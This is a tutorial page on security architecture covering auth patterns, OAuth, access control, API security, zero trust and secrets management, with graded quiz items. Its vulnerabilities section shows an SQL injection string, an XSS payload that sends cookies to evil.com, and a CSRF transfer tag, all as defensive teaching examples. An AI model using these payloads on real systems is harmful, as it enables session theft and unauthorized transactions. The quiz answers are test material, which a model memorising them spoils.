---
title: "Part 5: Security Architecture"
subtitle: "Authentication, Authorization, API Security & Zero Trust"
linkTitle: "Part 5: Security Architecture"
weight: 5
type: "docs"
quiz:
  - q: "Your team stores JWT secrets in a .env file committed to Git. A contractor who left the project still has repo access. What's the risk and how do you fix it?"
    concepts:
      - label: "secret exposure"
        terms: ["secret", "exposed", "leaked", "committed", "in git", "in repo", "visible", "plaintext"]
      - label: "rotate credentials"
        terms: ["rotate", "revoke", "change", "invalidate", "new secret", "new key", "regenerate"]
      - label: "use a vault"
        terms: ["vault", "secrets manager", "key management", "KMS", "parameter store", "external store", "not in code"]
      - label: "access control"
        terms: ["access", "permission", "least privilege", "remove access", "contractor", "revoke access"]
    answer: "The JWT secret is exposed to anyone with repo access, including the former contractor. Fix: rotate the secret immediately, move secrets to a vault (AWS Secrets Manager, HashiCorp Vault), and revoke the contractor's repo access."
  - q: "A user with role 'editor' can somehow delete other users' accounts. Your app uses RBAC. What went wrong and how do you debug it?"
    concepts:
      - label: "role misconfiguration"
        terms: ["role", "permission", "misconfigur", "wrong permission", "too many permission", "overly permissive", "assigned wrong"]
      - label: "check role-permission mapping"
        terms: ["mapping", "check", "audit", "review", "inspect", "role definition", "permission matrix"]
      - label: "principle of least privilege"
        terms: ["least privilege", "minimal", "only what they need", "restrict", "narrow", "tighten"]
      - label: "missing authorization check"
        terms: ["missing check", "no check", "forgot", "skipped", "bypass", "not enforced", "middleware missing"]
    answer: "Either the 'editor' role has delete permissions it shouldn't, or the delete endpoint is missing an authorization check. Audit the role-permission mapping, ensure the delete route has middleware enforcing the correct role, and apply least privilege."
  - q: "Your public API has no rate limiting. A single client starts sending 10,000 requests per second. What happens and what do you implement?"
    concepts:
      - label: "denial of service"
        terms: ["DoS", "denial of service", "overwhelm", "crash", "unavailable", "down", "overload", "exhaust"]
      - label: "rate limiting"
        terms: ["rate limit", "throttle", "limit requests", "requests per second", "quota", "429"]
      - label: "token bucket or sliding window"
        terms: ["token bucket", "sliding window", "fixed window", "leaky bucket", "algorithm", "counter"]
      - label: "identify clients"
        terms: ["API key", "IP address", "client ID", "identify", "per-client", "per-user", "per-key"]
    answer: "Without rate limiting, the API is vulnerable to DoS — resources are exhausted and legitimate users are blocked. Implement rate limiting (token bucket or sliding window) per client (API key or IP), return 429 Too Many Requests when exceeded."
  - q: "Your app builds SQL queries by concatenating user input directly. A user submits the value: ' OR 1=1 --. What happens and how do you prevent it?"
    concepts:
      - label: "SQL injection"
        terms: ["SQL injection", "inject", "malicious SQL", "manipulate query", "alter query", "escape"]
      - label: "data exposure or destruction"
        terms: ["data", "expose", "leak", "delete", "drop", "all records", "bypass", "unauthorized"]
      - label: "parameterized queries"
        terms: ["parameterized", "prepared statement", "placeholder", "bind", "$1", "?", ":param"]
      - label: "never concatenate"
        terms: ["never concatenate", "don't concatenate", "no string concat", "no interpolat", "no template literal"]
    answer: "The injected value modifies the SQL query to return all records or bypass authentication. The attacker can read, modify, or delete data. Prevent it by always using parameterized queries — never concatenate user input into SQL strings."
  - q: "You're building a mobile app that needs to access a user's Google Calendar. Should you use client credentials flow or authorization code flow with PKCE? Why?"
    concepts:
      - label: "authorization code flow with PKCE"
        terms: ["authorization code", "PKCE", "auth code", "code flow", "code + PKCE"]
      - label: "user consent required"
        terms: ["user", "consent", "permission", "on behalf of", "delegated", "user's data", "user context"]
      - label: "client credentials is machine-to-machine"
        terms: ["client credentials", "machine-to-machine", "no user", "service-to-service", "server", "backend only"]
      - label: "public client"
        terms: ["public client", "mobile", "can't store secret", "no client secret", "untrusted", "native app"]
    answer: "Authorization code flow with PKCE. The app needs to act on behalf of a user (their calendar), so user consent is required. Client credentials is for machine-to-machine with no user context. Mobile apps are public clients that can't safely store a client secret, so PKCE is essential."
---

## Authentication vs Authorization

Two concepts that are often confused but serve completely different purposes.

**Authentication** (AuthN) = "Who are you?" — verifying identity.
**Authorization** (AuthZ) = "What can you do?" — verifying permissions.

<div class="diagram">
  <div class="layer">User presents credentials (username + password, token, certificate)</div>
  <div class="arrow">↓</div>
  <div class="layer"><strong>Authentication</strong> — Is this person who they claim to be?</div>
  <div class="arrow">↓</div>
  <div class="layer"><strong>Authorization</strong> — Is this verified person allowed to do this action?</div>
  <div class="arrow">↓</div>
  <div class="layer">Access granted or denied</div>
</div>

| | Authentication | Authorization |
|---|---|---|
| **Question** | Who are you? | What can you do? |
| **Happens** | First | After authentication |
| **Mechanism** | Passwords, tokens, biometrics | Roles, policies, permissions |
| **Failure** | 401 Unauthorized | 403 Forbidden |

<div class="callout">
  <strong>The hotel analogy:</strong> Authentication is showing your ID at check-in. Authorization is your key card only opening <em>your</em> room, not every room.
</div>

## Authentication Patterns

### Session-Based Authentication

The traditional approach. Server creates a session after login and stores it (in memory, database, or Redis). The client receives a session ID via a cookie.

```text
Client                          Server
  |--- POST /login (creds) ------>|
  |                                |-- validate creds
  |                                |-- create session in store
  |<-- Set-Cookie: sid=abc123 ----|
  |                                |
  |--- GET /profile               |
  |    Cookie: sid=abc123 -------->|
  |                                |-- lookup session "abc123"
  |<-- 200 { user data } ---------|
```

**Pros:** Easy to revoke (delete the session), server controls everything.
**Cons:** Server must store state, harder to scale across multiple servers without shared session store.

### Token-Based Authentication (JWT)

Stateless. The server issues a signed token containing claims. The client sends it with every request. The server validates the signature — no session store needed.

<span class="label label-ts">TypeScript</span> — JWT creation and validation:

```typescript
import jwt from "jsonwebtoken";

const SECRET = process.env.JWT_SECRET!;

// Create a token after successful login
function createToken(userId: string, role: string): string {
  return jwt.sign({ sub: userId, role }, SECRET, { expiresIn: "1h" });
}

// Middleware to validate token
function authenticate(req: Request, res: Response, next: NextFunction) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "No token provided" });

  try {
    req.user = jwt.verify(token, SECRET) as { sub: string; role: string };
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}
```

<span class="label label-py">Python</span> — JWT creation and validation:

```python
import jwt
from datetime import datetime, timedelta, timezone
import os

SECRET = os.environ["JWT_SECRET"]

def create_token(user_id: str, role: str) -> str:
    payload = {
        "sub": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def validate_token(token: str) -> dict:
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

<div class="callout tip">
  <strong>JWT tradeoff:</strong> JWTs are stateless and scalable, but you can't revoke them before expiry without maintaining a blocklist — which reintroduces state. Keep expiry times short and use refresh tokens.
</div>

### API Keys

Simple, long-lived tokens for service-to-service or developer API access. Not tied to a user session.

```text
GET /api/data HTTP/1.1
X-API-Key: sk_live_abc123def456
```

**When to use:** Machine-to-machine communication, third-party developer access, internal service calls.
**When NOT to use:** End-user authentication (no user context, hard to scope permissions).

| Pattern | Stateful? | Best For |
|---|---|---|
| Session-based | Yes (server stores sessions) | Traditional web apps, easy revocation |
| JWT | No (token is self-contained) | APIs, microservices, SPAs |
| API Keys | No | Service-to-service, developer APIs |

## OAuth 2.0 & OpenID Connect

**OAuth 2.0** is an authorization framework — it lets a third-party app access resources on behalf of a user without sharing their password.

**OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0 — it adds authentication (who the user is) via an ID token.

### Authorization Code Flow

The most secure flow for web and mobile apps. Used when a user is involved.

<div class="diagram">
  <div class="layer">1. User clicks "Login with Google"</div>
  <div class="arrow">↓</div>
  <div class="layer">2. App redirects to Authorization Server (Google)<br><code>/authorize?response_type=code&client_id=...&redirect_uri=...&scope=openid profile</code></div>
  <div class="arrow">↓</div>
  <div class="layer">3. User authenticates & consents</div>
  <div class="arrow">↓</div>
  <div class="layer">4. Authorization Server redirects back with <strong>authorization code</strong><br><code>https://yourapp.com/callback?code=abc123</code></div>
  <div class="arrow">↓</div>
  <div class="layer">5. App exchanges code for tokens (server-to-server)<br><code>POST /token { code, client_id, client_secret, redirect_uri }</code></div>
  <div class="arrow">↓</div>
  <div class="layer">6. Authorization Server returns <strong>access token</strong> + <strong>ID token</strong> (OIDC)</div>
  <div class="arrow">↓</div>
  <div class="layer">7. App uses access token to call APIs on behalf of user</div>
</div>

### Client Credentials Flow

Machine-to-machine. No user involved. The app authenticates itself directly.

```text
POST /token
  grant_type=client_credentials
  &client_id=my-service
  &client_secret=secret123
  &scope=read:data
```

### When to Use Which

| Flow | Use Case |
|---|---|
| Authorization Code | Web apps, mobile apps — user is involved |
| Authorization Code + PKCE | SPAs, mobile/native apps — public clients that can't store a secret |
| Client Credentials | Service-to-service — no user context |
| Device Code | Smart TVs, CLI tools — limited input devices |

<div class="callout info">
  <strong>PKCE</strong> (Proof Key for Code Exchange) protects the authorization code flow for public clients. The app generates a random <code>code_verifier</code>, sends a hash (<code>code_challenge</code>) in the authorize request, and proves possession by sending the original verifier when exchanging the code. This prevents interception attacks.
</div>

## Authorization Patterns

Authentication tells you *who* someone is. Authorization decides *what they can do*.

### Role-Based Access Control (RBAC)

Permissions are assigned to roles, users are assigned roles. Simple and widely used.

<span class="label label-ts">TypeScript</span>

```typescript
type Role = "admin" | "editor" | "viewer";

const permissions: Record<Role, string[]> = {
  admin:  ["read", "write", "delete", "manage_users"],
  editor: ["read", "write"],
  viewer: ["read"],
};

function authorize(role: Role, action: string): boolean {
  return permissions[role]?.includes(action) ?? false;
}

// Middleware
function requirePermission(action: string) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!authorize(req.user.role, action)) {
      return res.status(403).json({ error: "Forbidden" });
    }
    next();
  };
}

// Usage
app.delete("/users/:id", authenticate, requirePermission("manage_users"), deleteUser);
```

### Attribute-Based Access Control (ABAC)

Decisions based on attributes of the user, resource, and environment. More flexible than RBAC.

<span class="label label-ts">TypeScript</span>

```typescript
interface AccessRequest {
  user: { id: string; department: string; clearanceLevel: number };
  resource: { ownerId: string; classification: number };
  action: string;
}

function evaluateAccess(req: AccessRequest): boolean {
  // Users can only edit resources in their department
  if (req.action === "edit" && req.resource.ownerId !== req.user.id) return false;
  // Clearance level must meet or exceed resource classification
  if (req.user.clearanceLevel < req.resource.classification) return false;
  return true;
}
```

### Policy-Based Access Control

Externalize authorization logic into policies. Decouples business rules from application code.

<span class="label label-ts">TypeScript</span>

```typescript
interface Policy {
  effect: "allow" | "deny";
  condition: (ctx: AccessContext) => boolean;
}

const policies: Policy[] = [
  {
    effect: "deny",
    condition: (ctx) => ctx.time.getHours() < 6 || ctx.time.getHours() > 22,
  },
  {
    effect: "allow",
    condition: (ctx) => ctx.user.role === "admin",
  },
  {
    effect: "allow",
    condition: (ctx) => ctx.user.id === ctx.resource.ownerId,
  },
];

function evaluate(ctx: AccessContext): boolean {
  for (const policy of policies) {
    if (policy.condition(ctx)) return policy.effect === "allow";
  }
  return false; // default deny
}
```

<div class="callout tip">
  <strong>Choosing a pattern:</strong><br>
  • <strong>RBAC</strong> — simple apps with clear role hierarchies (admin, editor, viewer)<br>
  • <strong>ABAC</strong> — complex rules based on multiple attributes (department, time, classification)<br>
  • <strong>Policy-based</strong> — when authorization rules change frequently or need to be managed externally (e.g., OPA, Cedar)
</div>

## API Security

### Rate Limiting

Prevents abuse and ensures fair usage. Without it, a single client can overwhelm your service.

<span class="label label-ts">TypeScript</span> — sliding window rate limiter middleware:

```typescript
const requestCounts = new Map<string, { count: number; resetAt: number }>();

function rateLimit(maxRequests: number, windowMs: number) {
  return (req: Request, res: Response, next: NextFunction) => {
    const key = req.ip!;
    const now = Date.now();
    const record = requestCounts.get(key);

    if (!record || now > record.resetAt) {
      requestCounts.set(key, { count: 1, resetAt: now + windowMs });
      return next();
    }

    if (record.count >= maxRequests) {
      return res.status(429).json({ error: "Too many requests" });
    }

    record.count++;
    next();
  };
}

// 100 requests per 15 minutes
app.use(rateLimit(100, 15 * 60 * 1000));
```

<span class="label label-py">Python</span> — rate limiter concept:

```python
import time

class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window = window_seconds
        self.clients: dict[str, dict] = {}

    def is_allowed(self, client_id: str) -> bool:
        now = time.time()
        record = self.clients.get(client_id)
        if not record or now > record["reset_at"]:
            self.clients[client_id] = {"count": 1, "reset_at": now + self.window}
            return True
        if record["count"] >= self.max_requests:
            return False
        record["count"] += 1
        return True
```

### Input Validation

Never trust client input. Validate at the boundary.

<span class="label label-ts">TypeScript</span>

```typescript
import { z } from "zod";

const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150),
});

app.post("/users", (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.issues });
  }
  // result.data is typed and validated
  createUser(result.data);
});
```

### CORS (Cross-Origin Resource Sharing)

Controls which origins can call your API from a browser. Without it, any website could make requests to your API using a logged-in user's cookies.

```typescript
app.use(cors({
  origin: ["https://yourapp.com"],  // NOT "*" in production
  methods: ["GET", "POST", "PUT", "DELETE"],
  credentials: true,
}));
```

<div class="callout">
  <strong>Never use <code>origin: "*"</code> with <code>credentials: true</code>.</strong> This allows any website to make authenticated requests to your API. Always whitelist specific origins.
</div>

### HTTPS

All traffic must be encrypted in transit. There is no exception.

- Terminate TLS at the load balancer or reverse proxy
- Redirect all HTTP to HTTPS
- Use HSTS headers to prevent downgrade attacks
- Keep certificates valid and auto-renewed (Let's Encrypt, ACM)

## Zero Trust Architecture

Traditional security: "Trust everything inside the network perimeter."
Zero Trust: **"Never trust, always verify."**

### Core Principles

1. **Verify explicitly** — authenticate and authorize every request, regardless of network location
2. **Least privilege access** — grant minimum permissions needed, just-in-time and just-enough
3. **Assume breach** — design as if attackers are already inside your network

<div class="diagram">
  <div class="layer"><strong>Traditional (Castle & Moat)</strong><br>Firewall protects the perimeter. Once inside, everything is trusted.</div>
  <div class="arrow">vs</div>
  <div class="layer"><strong>Zero Trust</strong><br>Every request is verified. No implicit trust based on network location.<br>Service A → <em>authenticate + authorize</em> → Service B</div>
</div>

### Micro-Segmentation

Instead of one flat network, divide into small segments. Each service can only communicate with explicitly allowed services.

```text
┌─────────────┐     ✅ allowed      ┌─────────────┐
│  Order Svc  │ ──────────────────→  │ Payment Svc │
└─────────────┘                      └─────────────┘
       │
       │  ❌ blocked
       ↓
┌─────────────┐
│  HR Service │
└─────────────┘
```

<div class="callout tip">
  <strong>Zero Trust in practice:</strong><br>
  • mTLS between services (mutual TLS — both sides present certificates)<br>
  • Service mesh (Istio, Linkerd) for automatic mTLS and policy enforcement<br>
  • Short-lived credentials — no long-lived API keys between services<br>
  • Identity-aware proxies (BeyondCorp model)
</div>

## Secrets Management

### What NOT to Do

<span class="bad">Hardcoded secrets (never do this):</span> <span class="label label-ts">TypeScript</span>

```typescript
// ❌ NEVER — secrets in source code
const DB_PASSWORD = "super_secret_123";
const API_KEY = "sk_live_abc123";
const JWT_SECRET = "my-jwt-secret";
```

<span class="bad">Committed .env files (also bad):</span>

```text
# ❌ .env committed to Git
DB_PASSWORD=super_secret_123
API_KEY=sk_live_abc123
```

### The Proper Approach

**Level 1: Environment variables** (minimum acceptable):

```typescript
// ✅ Read from environment — never hardcode
const dbPassword = process.env.DB_PASSWORD;
if (!dbPassword) throw new Error("DB_PASSWORD not set");
```

**Level 2: Secrets manager** (recommended for production):

<span class="label label-ts">TypeScript</span>

```typescript
import { SecretsManager } from "@aws-sdk/client-secrets-manager";

const client = new SecretsManager({});

async function getSecret(name: string): Promise<string> {
  const response = await client.getSecretValue({ SecretId: name });
  return response.SecretString!;
}

// Usage
const dbPassword = await getSecret("prod/db-password");
```

<span class="label label-py">Python</span>

```python
import boto3

def get_secret(name: str) -> str:
    client = boto3.client("secretsmanager")
    response = client.get_secret_value(SecretId=name)
    return response["SecretString"]

db_password = get_secret("prod/db-password")
```

<div class="callout info">
  <strong>Secrets management checklist:</strong><br>
  • Never commit secrets to version control — add <code>.env</code> to <code>.gitignore</code><br>
  • Rotate secrets regularly and automate rotation<br>
  • Use a vault (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)<br>
  • Audit access to secrets — who accessed what and when<br>
  • Use different secrets per environment (dev, staging, prod)
</div>

## Common Vulnerabilities

### SQL Injection

Attacker manipulates SQL queries by injecting malicious input.

<span class="bad">Vulnerable:</span> <span class="label label-ts">TypeScript</span>

```typescript
// ❌ String concatenation — SQL injection risk
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Input: ' OR 1=1 --
// Becomes: SELECT * FROM users WHERE email = '' OR 1=1 --'
// Returns ALL users
```

<span class="good">Safe:</span> <span class="label label-ts">TypeScript</span>

```typescript
// ✅ Parameterized query — input is treated as data, not SQL
const result = await pool.query(
  "SELECT * FROM users WHERE email = $1",
  [req.body.email]
);
```

<span class="good">Safe:</span> <span class="label label-py">Python</span>

```python
# ✅ Parameterized query
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

### Cross-Site Scripting (XSS)

Attacker injects malicious scripts into pages viewed by other users.

<span class="bad">Vulnerable:</span>

```typescript
// ❌ Rendering user input as raw HTML
res.send(`<h1>Welcome, ${req.query.name}</h1>`);
// Input: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

<span class="good">Prevention:</span>

```typescript
// ✅ Escape output — use a templating engine that auto-escapes
// ✅ Set Content-Security-Policy headers
// ✅ Use HttpOnly cookies (JavaScript can't access them)
app.use(helmet()); // Sets security headers including CSP
```

### Cross-Site Request Forgery (CSRF)

Attacker tricks a logged-in user's browser into making unwanted requests.

```text
User is logged into bank.com
Attacker's page has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
Browser sends the request WITH the user's cookies → money transferred
```

<span class="good">Prevention:</span>

```typescript
// ✅ CSRF tokens — server generates a token, client must include it
import csrf from "csurf";
app.use(csrf({ cookie: true }));

// ✅ SameSite cookies — browser won't send cookies on cross-origin requests
res.cookie("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});
```

<div class="callout">
  <strong>Defense in depth:</strong> Don't rely on a single security measure. Combine parameterized queries + input validation, CSP headers + output escaping, CSRF tokens + SameSite cookies.
</div>

## Key Takeaways

1. **Authentication ≠ Authorization** — verify identity first, then check permissions
2. **Use JWTs for stateless APIs**, sessions for traditional web apps — understand the tradeoffs
3. **OAuth 2.0 authorization code flow** for user-facing apps, **client credentials** for machine-to-machine
4. **RBAC for simple apps**, ABAC or policy-based for complex permission models
5. **Rate limit, validate input, configure CORS** — API security is non-negotiable
6. **Zero Trust: never trust, always verify** — even inside your own network
7. **Never hardcode secrets** — use environment variables at minimum, a secrets vault in production
8. **Parameterized queries prevent SQL injection** — never concatenate user input into queries
9. **Defense in depth** — layer multiple security controls, assume any single one can fail

## Check Your Understanding

{{< quiz >}}
